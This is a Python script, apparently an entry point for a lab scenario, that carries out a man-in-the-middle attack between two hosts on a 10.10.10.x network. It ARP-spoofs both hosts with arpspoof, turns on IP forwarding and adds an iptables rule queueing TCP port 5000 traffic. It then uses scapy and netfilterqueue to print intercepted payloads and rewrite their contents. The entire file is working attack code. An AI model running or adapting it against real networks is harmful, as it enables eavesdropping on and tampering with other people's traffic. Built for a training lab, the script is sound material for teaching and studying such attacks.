"""
scenario entrypoint for mitm.
"""

from typing import Callable

from scapy.layers.inet import TCP, IP
from scapy.packet import Raw, Packet as ScapyPacket
from netfilterqueue import NetfilterQueue, Packet

import subprocess
from scapy.all import get_if_hwaddr

ALICE_IP = "10.10.10.20"
BOB_IP = "10.10.10.30"
ATTACKER_IFACE = "eth0"
ATTACKER_MAC = get_if_hwaddr(ATTACKER_IFACE)

def set_ip_forwarding(value: bool) -> None:
    """
    Set ip forwarding on the system.

    :param value:
    :return:
    """
    str_value = "1" if value else "0"
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write(str_value)

def print_packet(ip: ScapyPacket) -> None:
    """


    :param ip:
    :return:
    """
    if IP in ip and TCP in ip:
        src = ip[IP].src
        dst = ip[IP].dst
        payload = bytes(ip[TCP].payload)
        if payload:
            try:
                payload = payload.decode(errors="replace")
            except Exception:
                payload = "<binary>"
            print(f"[MITM] {src} → {dst}: {payload}", flush=True)

def manipulate_packet(packet: Packet) -> None:
    """
    Intercept and manipulate packets.

    :param packet:
    :return:
    """
    ip = IP(packet.get_payload())

    # print("[+] Received packet...")
    print_packet(ip)

    if ip.haslayer(Raw):
        #print("[+] Packet contains raw payload, manipulating...", flush=True)
        payload: bytes = ip[Raw].load
        #print(f"[+] Raw payload: {payload} ({type(payload)})", flush=True)

        print("[+] Modifying packet", flush=True)

        new_payload = payload.replace(b"says hello", b"H4X0R nsak")

        ip[Raw].load = new_payload

        del ip[IP].len
        del ip[IP].chksum
        del ip[TCP].chksum

    packet.set_payload(bytes(ip))
    packet.accept()

def setup_netfilter_iptables() -> None:
    """
    Setup iptables rules for forwarding packets to netfilter queue.

    :return:
    """

    subprocess.Popen([
        "iptables",
        "-I",
        "FORWARD",
        "-p",
        "tcp",
        "--dport",
        "5000",
        "-j",
        "NFQUEUE",
        "--queue-num",
        "1"
    ])

def setup_netfilter_queue(packet_handler: Callable[[Packet], None]) -> None:
    """
    Setup netfilter queue for intercepting packets.

    :param packet_handler:
    :return:
    """
    netfilter_queue = NetfilterQueue()
    netfilter_queue.bind(1, packet_handler)
    netfilter_queue.run()

def arp_spoof(iface: str, target_ip: str, spoof_ip: str) -> None:
    """
    Start arp spoofing on the provided interface.

    :param iface:
    :param target_ip:
    :param spoof_ip:
    :return:
    """
    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, spoof_ip])


def run() -> None:
    """
    Scenario, which runs MITM attack, based on arp spoofing.

    :return: None
    """

    set_ip_forwarding(True)
    arp_spoof(ATTACKER_IFACE, ALICE_IP, BOB_IP)
    arp_spoof(ATTACKER_IFACE, BOB_IP, ALICE_IP)
    setup_netfilter_iptables()
    setup_netfilter_queue(manipulate_packet)


if __name__ == "__main__":
    run()
